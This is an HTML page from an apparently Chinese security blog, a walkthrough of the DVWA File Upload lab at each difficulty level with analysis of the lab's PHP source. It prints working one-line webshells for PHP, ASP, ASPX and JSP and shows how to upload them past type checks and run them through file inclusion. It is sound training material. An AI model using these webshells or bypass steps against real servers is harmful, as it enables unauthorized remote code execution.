@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVWA 靶场 File Upload 全难度教程（附代码分析） - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=DVWA" class="tag tag-cyan">#DVWA</a>
+    <a href="../tags/list.html?tag=文件上传" class="tag tag-orange">#文件上传</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2025 // 05 / 08</div>
+  <div class="post-title">DVWA 靶场 File Upload 全难度教程（附代码分析）</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</span>
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">文件上传</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h4"><a href="#intro">简介与 OWASP BWA</a></li>
+    <li class="toc-h4"><a href="#principle">File Upload 原理</a>
+      <ul>
+        <li class="toc-h5"><a href="#webshell">一句话木马</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#low">Low 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#low-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#low-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#medium">Medium 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#medium-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#medium-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#high">High 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#high-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#high-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#impossible">Impossible 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#impossible-code">代码分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h4 id="intro">简介与 OWASP BWA</h4>
+
+<p>建议使用 owaspbwa 靶场可以不用搭建 DVWA 以及其他常用靶场，省去搭建靶场的困扰，但是此靶机靶场较老，并不建议使用。</p>
+
+<p>owaspbwa 下载地址：<a href="https://sourceforge.net/projects/owaspbwa/files/">OWASP Broken Web Applications Project</a></p>
+
+<p>注：owaspbwa 的本机用户名 root 密码 owaspbwa，记得看看靶机的 IP 方便以后使用。DVWA 的用户名和密码都为 admin（owaspbwa 中的 DVWA 是此，其他的用户名为 admin 密码为 password）。</p>
+
+<h4 id="principle">File Upload 原理</h4>
+
+<p>就是将客户端的文件上传到服务器的过程叫文件上传，于是我们上传木马的话会拿到服务器的信息，也就是后门文件。</p>
+
+<p><img src="../assets/fu_image001.png" alt="" style="max-width:100%"></p>
+
+<p>使用较多的为一句话木马。</p>
+
+<h5 id="webshell">一句话木马</h5>
+
+<table>
+  <thead>
+    <tr><th>语言</th><th>一句话木马</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>php</td><td><code>&lt;?php eval($_GET['pass']);?&gt;</code></td></tr>
+    <tr><td>asp</td><td><code>&lt;%execute(request("cmd"))%&gt;</code></td></tr>
+    <tr><td>aspx</td><td><code>&lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["xindong"],"unsafe");%&gt;</code><br>密码: webadmin</td></tr>
+    <tr><td>jsp</td><td><code>&lt;%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%&gt;</code></td></tr>
+  </tbody>
+</table>
+
+<h4 id="low">Low 难度</h4>
+
+<h5 id="low-exploit">漏洞利用</h5>
+
+<p>将此代码写入 PHP 文件（密码是 password）：</p>
+
+<pre><code>&lt;?php eval(@$_POST['password']);?&gt;</code></pre>
+
+<p><img src="../assets/fu_image002.png" alt="" style="max-width:100%"></p>
+
+<p>上传它：</p>
+
+<p><img src="../assets/fu_image003.png" alt="" style="max-width:100%"></p>
+
+<p>就能直接看到文件路径，访问它用蚁剑链接就可以：</p>
+
+<p><img src="../assets/fu_image004.png" alt="" style="max-width:100%"></p>
+
+<p>空白就是访问成功：</p>
+
+<p><img src="../assets/fu_image005.png" alt="" style="max-width:100%"></p>
+
+<p><img src="../assets/fu_image006.png" alt="" style="max-width:100%"></p>
+
+<p>连接完成拿到 Web 管理权限。</p>
+
+<h5 id="low-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+    // Can we move the file to the upload folder?
+    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
+        // No
+        echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';
+    }
+    else {
+        // Yes!
+        echo "&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;";
+    }
+}
+
+?&gt;</code></pre>
+
+<p>本代码没有对文件做任何限制，可以随便上传。</p>
+
+<h4 id="medium">Medium 难度</h4>
+
+<h5 id="medium-exploit">漏洞利用</h5>
+
+<p>预先写好一句话木马，并在木马文件路径下打开 cmd（记得准备一张图片）：</p>
+
+<p><img src="../assets/fu_image007.png" alt="" style="max-width:100%"></p>
+
+<p>生成的文件会和原来的文件一样，将生成文件上传（注意图片的大小），打开 Burp 进行抓包：</p>
+
+<p><img src="../assets/fu_image008.png" alt="" style="max-width:100%"></p>
+
+<p>2.png 直接修改为 2.php，上传成功，直接访问（不知道路径的话能先直接上传一个文件拿到路径）：</p>
+
+<p><img src="../assets/fu_image009.png" alt="" style="max-width:100%"></p>
+
+<p>这里是图片的信息，可以不管，看到这用蚁剑链接就成功了：</p>
+
+<p><img src="../assets/fu_image010.png" alt="" style="max-width:100%"></p>
+
+<p><img src="../assets/fu_image011.png" alt="" style="max-width:100%"></p>
+
+<p>拿到 Web 管理权限。</p>
+
+<h5 id="medium-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+    // File information
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+
+    // Is it an image?
+    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
+        ( $uploaded_size &lt; 100000 ) ) {
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
+            // No
+            echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';
+        }
+        else {
+            // Yes!
+            echo "&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;";
+        }
+    }
+    else {
+        // Invalid file
+        echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';
+    }
+}
+
+?&gt;</code></pre>
+
+<p>代码限制了文件类型 png 和 jpeg，而且限制了大小，只要控制好大小就没有问题。</p>
+
+<h4 id="high">High 难度</h4>
+
+<h5 id="high-exploit">漏洞利用</h5>
+
+<p>与中级难度一样，先要生成一个带木马的图片，上传就行：</p>
+
+<p><img src="../assets/fu_image012.png" alt="" style="max-width:100%"></p>
+
+<p>接下来要利用另外一个漏洞，文件包含（此漏洞会将读取的文件当 PHP 代码执行）。知道路径，就直接点，利用 file 协议：</p>
+
+<pre><code>?page=file:///C:/phpStudy/WWW/dvwa/hackable/uploads/3.jpg</code></pre>
+
+<p>在 F12 中可以看到 Cookie 信息。</p>
+
+<h5 id="high-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+    // File information
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
+
+    // Is it an image?
+    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
+        ( $uploaded_size &lt; 100000 ) &amp;&amp;
+        getimagesize( $uploaded_tmp ) ) {
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
+            // No
+            echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';
+        }
+        else {
+            // Yes!
+            echo "&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;";
+        }
+    }
+    else {
+        // Invalid file
+        echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';
+    }
+}
+
+?&gt;</code></pre>
+
+<p>只能上传 jpg、png 和 jpeg 文件类型，而且强制文件类型（文件类型与后缀名无关，所以简单的修改文件后缀名的办法不能绕过），限制上传为图片。</p>
+
+<h4 id="impossible">Impossible 难度</h4>
+
+<h5 id="impossible-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+
+    // File information
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
+    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
+
+    // Where are we going to be writing to?
+    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
+    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
+    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
+    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
+    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
+
+    // Is it an image?
+    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) &amp;&amp;
+        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp;
+        getimagesize( $uploaded_tmp ) ) {
+
+        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
+        if( $uploaded_type == 'image/jpeg' ) {
+            $img = imagecreatefromjpeg( $uploaded_tmp );
+            imagejpeg( $img, $temp_file, 100);
+        }
+        else {
+            $img = imagecreatefrompng( $uploaded_tmp );
+            imagepng( $img, $temp_file, 9);
+        }
+        imagedestroy( $img );
+
+        // Can we move the file to the web root from the temp folder?
+        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
+            // Yes!
+            echo "&lt;pre&gt;&lt;a href='${target_path}${target_file}'&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;";
+        }
+        else {
+            // No
+            echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';
+        }
+
+        // Delete any temp files
+        if( file_exists( $temp_file ) )
+            unlink( $temp_file );
+    }
+    else {
+        // Invalid file
+        echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+
+<p>在 High 的基础上取消路径回显，修改文件名，并且对图像重新生成并压缩图片，就直接避免了变形后门和图片马。</p>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+/* sticky nav */
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+/* TOC active highlight */
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+/* code block header bar */
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+</body>
+</html>
